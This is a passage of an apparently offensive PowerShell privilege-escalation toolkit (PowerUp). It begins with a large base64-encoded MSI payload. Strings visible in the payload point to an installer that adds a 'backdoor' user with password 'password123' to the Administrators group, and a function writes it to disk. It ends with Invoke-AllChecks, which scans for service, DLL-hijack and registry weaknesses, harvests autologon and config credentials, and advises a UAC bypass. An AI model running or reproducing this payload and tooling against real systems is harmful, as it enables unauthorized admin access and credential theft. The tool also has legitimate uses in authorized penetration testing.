nZXRfQ3VsdHVyZQBzZXRfQ3VsdHVyZQBDdWx0dXJlAHNlbmRlcgBlAGRpc3Bvc2luZwB2YWx1ZQBTeXN0ZW0uUmVmbGVjdGlvbgBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5Q29tcGFueUF0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlUcmFkZW1hcmtBdHRyaWJ1dGUAQXNzZW1ibHlDdWx0dXJlQXR0cmlidXRlAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBDb21WaXNpYmxlQXR0cmlidXRlAEd1aWRBdHRyaWJ1dGUAQXNzZW1ibHlWZXJzaW9uQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1dGUAU3lzdGVtLkRpYWdub3N0aWNzAERlYnVnZ2FibGVBdHRyaWJ1dGUARGVidWdnaW5nTW9kZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAEVudmlyb25tZW50AGdldF9NYWNoaW5lTmFtZQBTdHJpbmcAQ29uY2F0AFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcwBEaXJlY3RvcnlFbnRyeQBEaXJlY3RvcnlFbnRyaWVzAGdldF9DaGlsZHJlbgBDb250cm9sAGdldF9UZXh0AEFkZABJbnZva2UAQ29tbWl0Q2hhbmdlcwBGaW5kAGdldF9QYXRoAFRvU3RyaW5nAEFwcGxpY2F0aW9uAEV4aXQASURpc3Bvc2FibGUAU3VzcGVuZExheW91dABTeXN0ZW0uRHJhd2luZwBQb2ludABzZXRfTG9jYXRpb24Ac2V0X05hbWUAU2l6ZQBzZXRfU2l6ZQBzZXRfVGFiSW5kZXgAc2V0X1RleHQAc2V0X0F1dG9TaXplAEV2ZW50SGFuZGxlcgBhZGRfQ2xpY2sAYWRkX1RleHRDaGFuZ2VkAEJ1dHRvbkJhc2UAc2V0X1VzZVZpc3VhbFN0eWxlQmFja0NvbG9yAFNpemVGAENvbnRhaW5lckNvbnRyb2wAc2V0X0F1dG9TY2FsZURpbWVuc2lvbnMAQXV0b1NjYWxlTW9kZQBzZXRfQXV0b1NjYWxlTW9kZQBzZXRfQ2xpZW50U2l6ZQBDb250cm9sQ29sbGVjdGlvbgBnZXRfQ29udHJvbHMAYWRkX0xvYWQAUmVzdW1lTGF5b3V0AFBlcmZvcm1MYXlvdXQAQ29tcGlsZXJHZW5lcmF0ZWRBdHRyaWJ1dGUAU3lzdGVtLkNvZGVEb20uQ29tcGlsZXIAR2VuZXJhdGVkQ29kZUF0dHJpYnV0ZQAuY2N0b3IAU2V0dGluZ3NCYXNlAFN5bmNocm9uaXplZABTVEFUaHJlYWRBdHRyaWJ1dGUARW5hYmxlVmlzdWFsU3R5bGVzAFNldENvbXBhdGlibGVUZXh0UmVuZGVyaW5nRGVmYXVsdABSdW4ARGVidWdnZXJOb25Vc2VyQ29kZUF0dHJpYnV0ZQBUeXBlAFJ1bnRpbWVUeXBlSGFuZGxlAEdldFR5cGVGcm9tSGFuZGxlAEFzc2VtYmx5AGdldF9Bc3NlbWJseQBFZGl0b3JCcm93c2FibGVBdHRyaWJ1dGUARWRpdG9yQnJvd3NhYmxlU3RhdGUAV2luZG93c0Zvcm1zQXBwbGljYXRpb24xLkZvcm0xLnJlc291cmNlcwBXaW5kb3dzRm9ybXNBcHBsaWNhdGlvbjEuUHJvcGVydGllcy5SZXNvdXJjZXMucmVzb3VyY2VzAAARVwBpAG4ATgBUADoALwAvAAATLABjAG8AbQBwAHUAdABlAHIAAAl1AHMAZQByAAAXUwBlAHQAUABhAHMAcwB3AG8AcgBkAAAHUAB1AHQAABdEAGUAcwBjAHIAaQBwAHQAaQBvAG4AAAlVAHMAZQByAAALZwByAG8AdQBwAAAHQQBkAGQAABF1AHMAZQByAG4AYQBtAGUAABFiAGEAYwBrAGQAbwBvAHIAAA1sAGEAYgBlAGwAMQAAEVUAcwBlAHIAbgBhAG0AZQAADWwAYQBiAGUAbAAyAAARUABhAHMAcwB3AG8AcgBkAAARcABhAHMAcwB3AG8AcgBkAAAXcABhAHMAcwB3AG8AcgBkADEAMgAzAAANbABhAGIAZQBsADMAAAtHAHIAbwB1AHAAAB1BAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByAHMAAA9iAHUAdAB0AG8AbgAxAAANQwByAGUAYQB0AGUAAAtGAG8AcgBtADEAABFVAHMAZQByACAAQQBkAGQAAFtXAGkAbgBkAG8AdwBzAEYAbwByAG0AcwBBAHAAcABsAGkAYwBhAHQAaQBvAG4AMQAuAFAAcgBvAHAAZQByAHQAaQBlAHMALgBSAGUAcwBvAHUAcgBjAGUAcwAAAAAA/erdtNjyrUWO4d3AzceaIwAIt3pcVhk04IkDIAABBiACARwSEQMGEhUEIAEBAgMGEhkDBhIdAwYSIQMGEgwEAAASDAQIABIMAwAAAQMGEiUDBhIpBAAAEiUEAAASKQUAAQESKQQIABIlBAgAEikEIAEBDgUgAQERYQQgAQEIAwAADgYAAw4ODg4IsD9ffxHVCjoEIAASeQMgAA4GIAISdQ4OBiACHA4dHA4HBhJ1EnUSdR0cHRwdHAUgAgEICAYgAQERgIkGIAEBEYCNBSACARwYBiABARKAkQUgAgEMDAYgAQERgJkGIAEBEYChBSAAEoClBSABARJ9BAEAAAAFIAIBDg5YAQBLTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5FZGl0b3JzLlNldHRpbmdzRGVzaWduZXIuU2V0dGluZ3NTaW5nbGVGaWxlR2VuZXJhdG9yBzkuMC4wLjAAAAgAARKAsRKAsQQAAQECBQABARIFQAEAM1N5c3RlbS5SZXNvdXJjZXMuVG9vbHMuU3Ryb25nbHlUeXBlZFJlc291cmNlQnVpbGRlcgcyLjAuMC4wAAAIAAESgL0RgMEFIAASgMUHIAIBDhKAxQQHARIlBiABARGAzQgBAAIAAAAAAB0BABhXaW5kb3dzRm9ybXNBcHBsaWNhdGlvbjEAAAUBAAAAABcBABJDb3B5cmlnaHQgwqkgIDIwMTQAACkBACQ5Zjk3ZmRiOS1iMDY1LTQwYmUtYjFkYy0yMDRjOGRkOTAwNzIAAAwBAAcxLjAuMC4wAAAIAQAIAAAAAAAeAQABAFQCFldyYXBOb25FeGNlcHRpb25UaHJvd3MBAAAAAAAAANZgXlMAAAAAAgAAAKcAAAD0OgAA9BwAAFJTRFPL5ad6NR2rSYRfSN8k5t+3AQAAAEM6XFVzZXJzXGFkYW1cRG9jdW1lbnRzXFZpc3VhbCBTdHVkaW8gMjAwOFxQcm9qZWN0c1xXaW5kb3dzRm9ybXNBcHBsaWNhdGlvbjFcV2luZG93c0Zvcm1zQXBwbGljYXRpb24xXG9ialxSZWxlYXNlXFdpbmRvd3NGb3Jtc0FwcGxpY2F0aW9uMS5wZGIAAMQ7AAAAAAAAAAAAAN47AAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAADQOwAAAAAAAAAAAAAAAF9Db3JFeGVNYWluAG1zY29yZWUuZGxsAAAAAAD/JQAgQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAEAAAACAAAIAYAAAAOAAAgAAAAAAAAAAAAAAAAAAAAQABAAAAUAAAgAAAAAAAAAAAAAAAAAAAAQABAAAAaAAAgAAAAAAAAAAAAAAAAAAAAQAAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAkAAAAKBAAAAwAwAAAAAAAAAAAADQQwAA6gEAAAAAAAAAAAAAMAM0AAAAVgBTAF8AVgBFAFIAUwBJAE8ATgBfAEkATgBGAE8AAAAAAL0E7/4AAAEAAAABAAAAAAAAAAEAAAAAAD8AAAAAAAAABAAAAAEAAAAAAAAAAAAAAAAAAABEAAAAAQBWAGEAcgBGAGkAbABlAEkAbgBmAG8AAAAAACQABAAAAFQAcgBhAG4AcwBsAGEAdABpAG8AbgAAAAAAAACwBJACAAABAFMAdAByAGkAbgBnAEYAaQBsAGUASQBuAGYAbwAAAGwCAAABADAAMAAwADAAMAA0AGIAMAAAAFwAGQABAEYAaQBsAGUARABlAHMAYwByAGkAcAB0AGkAbwBuAAAAAABXAGkAbgBkAG8AdwBzAEYAbwByAG0AcwBBAHAAcABsAGkAYwBhAHQAaQBvAG4AMQAAAAAAMAAIAAEARgBpAGwAZQBWAGUAcgBzAGkAbwBuAAAAAAAxAC4AMAAuADAALgAwAAAAXAAdAAEASQBuAHQAZQByAG4AYQBsAE4AYQBtAGUAAABXAGkAbgBkAG8AdwBzAEYAbwByAG0AcwBBAHAAcABsAGkAYwBhAHQAaQBvAG4AMQAuAGUAeABlAAAAAABIABIAAQBMAGUAZwBhAGwAQwBvAHAAeQByAGkAZwBoAHQAAABDAG8AcAB5AHIAaQBnAGgAdAAgAKkAIAAgADIAMAAxADQAAABkAB0AAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBuAGEAbQBlAAAAVwBpAG4AZABvAHcAcwBGAG8AcgBtAHMAQQBwAHAAbABpAGMAYQB0AGkAbwBuADEALgBlAHgAZQAAAAAAVAAZAAEAUAByAG8AZAB1AGMAdABOAGEAbQBlAAAAAABXAGkAbgBkAG8AdwBzAEYAbwByAG0AcwBBAHAAcABsAGkAYwBhAHQAaQBvAG4AMQAAAAAANAAIAAEAUAByAG8AZAB1AGMAdABWAGUAcgBzAGkAbwBuAAAAMQAuADAALgAwAC4AMAAAADgACAABAEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMAaQBvAG4AAAAxAC4AMAAuADAALgAwAAAA77u/PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5kYWxvbmU9InllcyI/Pg0KPGFzc2VtYmx5IHhtbG5zPSJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOmFzbS52MSIgbWFuaWZlc3RWZXJzaW9uPSIxLjAiPg0KICA8YXNzZW1ibHlJZGVudGl0eSB2ZXJzaW9uPSIxLjAuMC4wIiBuYW1lPSJNeUFwcGxpY2F0aW9uLmFwcCIvPg0KICA8dHJ1c3RJbmZvIHhtbG5zPSJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOmFzbS52MiI+DQogICAgPHNlY3VyaXR5Pg0KICAgICAgPHJlcXVlc3RlZFByaXZpbGVnZXMgeG1sbnM9InVybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206YXNtLnYzIj4NCiAgICAgICAgPHJlcXVlc3RlZEV4ZWN1dGlvbkxldmVsIGxldmVsPSJhc0ludm9rZXIiIHVpQWNjZXNzPSJmYWxzZSIvPg0KICAgICAgPC9yZXF1ZXN0ZWRQcml2aWxlZ2VzPg0KICAgIDwvc2VjdXJpdHk+DQogIDwvdHJ1c3RJbmZvPg0KPC9hc3NlbWJseT4NCgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAADAAAAPA7AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACBzZXQuICBUaGUgZGVmYXVsdCBpcyAiQUxMIi5BY3Rpb25Qcm9wZXJ0eVRoZSBwcm9wZXJ0eSB0byBzZXQgd2hlbiBhIHByb2R1Y3QgaW4gdGhpcyBzZXQgaXMgZm91bmQuQ29zdEluaXRpYWxpemVGaWxlQ29zdENvc3RGaW5hbGl6ZUluc3RhbGxWYWxpZGF0ZUluc3RhbGxJbml0aWFsaXplSW5zdGFsbEFkbWluUGFja2FnZUluc3RhbGxGaWxlc0luc3RhbGxGaW5hbGl6ZUV4ZWN1dGVBY3Rpb25QdWJsaXNoRmVhdHVyZXNQdWJsaXNoUHJvZHVjdGJ6LldyYXBwZWRTZXR1cFByb2dyYW1iei5DdXN0b21BY3Rpb25EbGxiei5Qcm9kdWN0Q29tcG9uZW50e0VERTEwRjZDLTMwRjQtNDJDQS1CNUM3LUFEQjkwNUU0NUJGQ31CWi5JTlNUQUxMRk9MREVScmVnOUNBRTU3QUY3QjlGQjRFRjI3MDZGOTVCNEI4M0I0MTlTZXRQcm9wZXJ0eUZvckRlZmVycmVkYnouTW9kaWZ5UmVnaXN0cnlbQlouV1JBUFBFRF9BUFBJRF1iei5TdWJzdFdyYXBwZWRBcmd1bWVudHNfU3Vic3RXcmFwcGVkQXJndW1lbnRzQDRiei5SdW5XcmFwcGVkU2V0dXBbYnouU2V0dXBTaXplXSAiW1NvdXJjZURpcl1cLiIgW0JaLklOU1RBTExfU1VDQ0VTU19DT0RFU10gKltCWi5GSVhFRF9JTlNUQUxMX0FSR1VNRU5UU11bV1JBUFBFRF9BUkdVTUVOVFNdX01vZGlmeVJlZ2lzdHJ5QDRiei5Vbmluc3RhbGxXcmFwcGVkX1VuaW5zdGFsbFdyYXBwZWRANFByb2dyYW1GaWxlc0ZvbGRlcmJ4anZpbHc3fFtCWi5DT01QQU5ZTkFNRV1UQVJHRVRESVIuU291cmNlRGlyUHJvZHVjdEZlYXR1cmVNYWluIEZlYXR1cmVQcm9kdWN0SWNvbkZpbmRSZWxhdGVkUHJvZHVjdHNMYXVuY2hDb25kaXRpb25zVmFsaWRhdGVQcm9kdWN0SURNaWdyYXRlRmVhdHVyZVN0YXRlc1Byb2Nlc3NDb21wb25lbnRzVW5wdWJsaXNoRmVhdHVyZXNSZW1vdmVSZWdpc3RyeVZhbHVlc1dyaXRlUmVnaXN0cnlWYWx1ZXNSZWdpc3RlclVzZXJSZWdpc3RlclByb2R1Y3RSZW1vdmVFeGlzdGluZ1Byb2R1Y3RzTk9UIFJFTU9WRSB+PSJBTEwiIEFORCBOT1QgVVBHUkFERVBST0RVQ1RDT0RFUkVNT1ZFIH49ICJBTEwiIEFORCBOT1QgVVBHUkFESU5HUFJPRFVDVENPREVOT1QgV0lYX0RPV05HUkFERV9ERVRFQ1RFRERvd25ncmFkZXMgYXJlIG5vdCBhbGxvd2VkLkFMTFVTRVJTMUFSUE5PUkVQQUlSQVJQTk9NT0RJRllBUlBQUk9EVUNUSUNPTkFSUEhFTFBMSU5LaHR0cDovL3d3dy5leGVtc2kuY29tQVJQVVJMSU5GT0FCT1VUQVJQQ09NTUVOVFNNU0kgVGVtcGxhdGUuQVJQQ09OVEFDVE15IGNvbnRhY3QgaW5mb3JtYXRpb24uQVJQVVJMVVBEQVRFSU5GT015IHVwZGF0ZSBpbmZvcm1hdGlvbi5CWi5WRVJGQlouV1JBUFBFRF9BUFBJRHs1NjYyODkxMi04RUQ0LTQ4RUYtQUM1Mi1FRTgzQTFCRkJGMTF9X2lzMUJaLkNPTVBBTllOQU1FRVhFTVNJLkNPTUJaLklOU1RBTExfU1VDQ0VTU19DT0RFUzBCWi5GSVhFRF9JTlNUQUxMX0FSR1VNRU5UUy9TSUxFTlQgQlouVUlOT05FX0lOU1RBTExfQVJHVU1FTlRTIEJaLlVJQkFTSUNfSU5TVEFMTF9BUkdVTUVOVFNCWi5VSVJFRFVDRURfSU5TVEFMTF9BUkdVTUVOVFNCWi5VSUZVTExfSU5TVEFMTF9BUkdVTUVOVFNCWi5GSVhFRF9VTklOU1RBTExfQVJHVU1FTlRTQlouVUlOT05FX1VOSU5TVEFMTF9BUkdVTUVOVFNCWi5VSUJBU0lDX1VOSU5TVEFMTF9BUkdVTUVOVFNCWi5VSVJFRFVDRURfVU5JTlNUQUxMX0FSR1VNRU5UU0JaLlVJRlVMTF9VTklOU1RBTExfQVJHVU1FTlRTYnouU2V0dXBTaXplMjMyOTYwTWFudWZhY3R1cmVyUHJvZHVjdENvZGV7MjcxQkJDRUQtRjM2QS00RThFLUE1NzYtOTQ1NUYwQ0EwMUE4fVByb2R1Y3RMYW5ndWFnZTEwMzNQcm9kdWN0TmFtZU1TSSBXcmFwcGVyIFRlbXBsYXRlUHJvZHVjdFZlcnNpb24xLjAuMC4we0NDMDM1QzE4LTBGQzctNDcwOC04ODA2LUQ0QjA5MUU1OUFBN31TZWN1cmVDdXN0b21Qcm9wZXJ0aWVzV0lYX0RPV05HUkFERV9ERVRFQ1RFRDtXSVhfVVBHUkFERV9ERVRFQ1RFRFNPRlRXQVJFXFtCWi5DT01QQU5ZTkFNRV1cTVNJIFdyYXBwZXJcSW5zdGFsbGVkXFtCWi5XUkFQUEVEX0FQUElEXUxvZ29uVXNlcltMb2dv"

    try {
        [System.Convert]::FromBase64String( $Binary ) | Set-Content -Path $Path -Encoding Byte
        Write-Verbose "MSI written out to '$Path'"

        $Out = New-Object PSObject 
        $Out | Add-Member Noteproperty 'OutputPath' $Path
        $Out
    }
    catch {
        Write-Warning "Error while writing to location '$Path': $_"
        $Out = New-Object PSObject 
        $Out | Add-Member Noteproperty 'OutputPath' $_
        $Out
    }
}


function Invoke-AllChecks {
<#
    .SYNOPSIS

        Runs all functions that check for various Windows privilege escalation opportunities.

    .PARAMETER HTMLReport

        Switch. Write a HTML version of the report to SYSTEM.username.html.

    .EXAMPLE

        PS C:\> Invoke-AllChecks

        Runs all escalation checks, output statuses for whatever's found.
#>

    [CmdletBinding()]
    Param(
        [Switch]
        $HTMLReport
    )

    if($HTMLReport) {
        $HtmlReportFile = "$($Env:ComputerName).$($Env:UserName).html"

        $Header = "<style>"
        $Header = $Header + "BODY{background-color:peachpuff;}"
        $Header = $Header + "TABLE{border-width: 1px;border-style: solid;border-color: black;border-collapse: collapse;}"
        $Header = $Header + "TH{border-width: 1px;padding: 0px;border-style: solid;border-color: black;background-color:thistle}"
        $Header = $Header + "TD{border-width: 3px;padding: 0px;border-style: solid;border-color: black;background-color:palegoldenrod}"
        $Header = $Header + "</style>"

        ConvertTo-HTML -Head $Header -Body "<H1>PowerUp report for '$($Env:ComputerName).$($Env:UserName)'</H1>" | Out-File $HtmlReportFile
    }

    # initial admin checks

    "`n[*] Running Invoke-AllChecks"

    $IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")

    if($IsAdmin){
        "[+] Current user already has local administrative privileges!"
        
        if($HTMLReport) {
            ConvertTo-HTML -Head $Header -Body "<H2>User Has Local Admin Privileges!</H2>" | Out-File -Append $HtmlReportFile
        }
        # return
    }
    else{
        "`n`n[*] Checking if user is in a local group with administrative privileges..."
        if( ($(whoami /groups) -like "*S-1-5-32-544*").length -eq 1 ){
            "[+] User is in a local group that grants administrative privileges!"
            "[+] Run a BypassUAC attack to elevate privileges to admin."

            if($HTMLReport) {
                ConvertTo-HTML -Head $Header -Body "<H2> User In Local Group With Adminisrtative Privileges</H2>" | Out-File -Append $HtmlReportFile
            }
        }
    }


    # Service checks

    "`n`n[*] Checking for unquoted service paths..."
    $Results = Get-ServiceUnquoted
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Head $Header -Body "<H2>Unquoted Service Paths</H2>" | Out-File -Append $HtmlReportFile
    }

    "`n`n[*] Checking service executable and argument permissions..."
    $Results = Get-ServiceFilePermission
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Head $Header -Body "<H2>Service Executable Permissions</H2>" | Out-File -Append $HtmlReportFile
    }

    "`n`n[*] Checking service permissions..."
    $Results = Get-ServicePermission
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Head $Header -Body "<H2>Service Permissions</H2>" | Out-File -Append $HtmlReportFile
    }


    # .dll hijacking

    "`n`n[*] Checking %PATH% for potentially hijackable .dll locations..."
    $Results = Find-PathHijack
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Head $Header -Body "<H2>%PATH% .dll Hijacks</H2>" | Out-File -Append $HtmlReportFile
    }


    # registry checks

    "`n`n[*] Checking for AlwaysInstallElevated registry key..."
    if (Get-RegAlwaysInstallElevated) {
        $Out = New-Object PSObject 
        $Out | Add-Member Noteproperty 'OutputFile' $OutputFile
        $Out | Add-Member Noteproperty 'AbuseFunction' "Write-UserAddMSI"
        $Results = $Out

        $Results | Format-List
        if($HTMLReport) {
            $Results | ConvertTo-HTML -Head $Header -Body "<H2>AlwaysInstallElevated</H2>" | Out-File -Append $HtmlReportFile
        }
    }

    "`n`n[*] Checking for Autologon credentials in registry..."
    $Results = Get-RegAutoLogon
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Head $Header -Body "<H2>Registry Autologons</H2>" | Out-File -Append $HtmlReportFile
    }


    "`n`n[*] Checking for vulnerable registry autoruns and configs..."
    $Results = Get-VulnAutoRun
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Head $Header -Body "<H2>Registry Autoruns</H2>" | Out-File -Append $HtmlReportFile
    }

    # other checks

    "`n`n[*] Checking for vulnerable schtask files/configs..."
    $Results = Get-VulnSchTask
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Head $Header -Body "<H2>Vulnerabl Schasks</H2>" | Out-File -Append $HtmlReportFile
    }

    "`n`n[*] Checking for unattended install files..."
    $Results = Get-UnattendedInstallFile
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Head $Header -Body "<H2>Unattended Install Files</H2>" | Out-File -Append $HtmlReportFile
    }

    "`n`n[*] Checking for encrypted web.config strings..."
    $Results = Get-Webconfig | Where-Object {$_}
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Head $Header -Body "<H2>Encrypted 'web.config' String</H2>" | Out-File -Append $HtmlReportFile
    }

    "`n`n[*] Checking for encrypted application pool and virtual directory passwords..."
    $Results = Get-ApplicationHost | Where-Object {$_}
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Head $Header -Body "<H2>Encrypted Application Pool Passwords</H2>" | Out-File -Append $HtmlReportFile
    }
    "`n"

    if($HTMLReport) {
        "[*] Report written to '$HtmlReportFile' `n"
    }
}
